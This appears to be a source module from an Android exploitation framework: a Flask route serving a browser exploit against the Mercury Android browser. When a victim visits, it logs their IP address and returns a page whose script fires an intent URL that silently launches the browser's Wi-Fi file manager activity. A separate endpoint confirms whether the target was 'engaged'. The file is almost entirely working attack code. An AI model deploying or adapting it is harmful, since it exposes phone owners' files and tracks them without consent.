import os
from . import src
from flask import request, make_response


@src.route('/exploits/mercury/wfm/<method>')
def exploit_mercury_wfm(method):

    """
    Browser Exploits
    """

    if method == "download":
        with open("".join([os.getcwd(), "/web/app/static/files/SampleVideo_1280x720_1mb.mp4"])) as f:
            mp4 = f.read()
            response = make_response(mp4)
            response.headers['Content-Disposition'] = 'attachment; filename=demo.mp4'
            return response

    if method == "intent":
        with open("web/app/logs/mercury.log", "w+") as f:
            f.write("".join("ip:{0}".format(request.remote_addr)))
            f.close()
            response = """

                <html>
                    <head>
                        <meta charset="utf-8" />
                    </head>
                    <body>
                        <script>
                            location.href="intent:#Intent;SEL;component=com.ilegendsoft.mercury/.external.wfm.ui.WFMActivity2;action=android.intent.action.VIEW;end";
                        </script>
                    </body>
                </html>

            """

            return response

    if method == "check":
        try:
            with open("web/app/logs/mercury.log", "r") as f:
                if f:
                    ip = f.readline().split(":")[1]
                    f.close()
                    os.remove("web/app/logs/mercury.log")
                    return ip
                else:
                    response = "Not Engaged"
                    return response
        except IOError:
            response = "Not Engaged"
            return response
